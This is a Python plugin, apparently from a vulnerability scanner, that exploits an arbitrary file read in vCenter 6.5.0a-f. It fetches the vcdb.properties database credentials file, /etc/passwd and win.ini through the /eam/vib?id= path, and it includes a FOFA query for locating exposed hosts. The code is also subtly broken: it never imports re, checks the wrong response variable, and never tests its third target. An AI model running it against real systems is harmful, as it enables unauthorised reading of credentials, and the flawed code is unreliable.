#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = "https://blog.csdn.net/qq_36197704/article/details/109162019"
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "vCenter 6.5.0a-f任意文件读取漏洞"
  ret['level'] = "high"
  ret['FOFA'] = 'title="ID_VC_Welcome"'
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  targets = ["/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties","/eam/vib?id=/etc/passwd","/eam/vib?id=C:/windows/win.ini"]
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  try:
    res=requests.get(url=url1,headers=headers,verify=False,timeout=5)
    if res.status_code == 200 and re.search(r'driver.*?dbtype.*?username.*?password.encrypted',res.text,re.S):
      ret['url'] = url1
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,verify=False,timeout=5)
    if resp.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,verify=False,timeout=5)
    if resp.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
  except:
    return ret
  return ret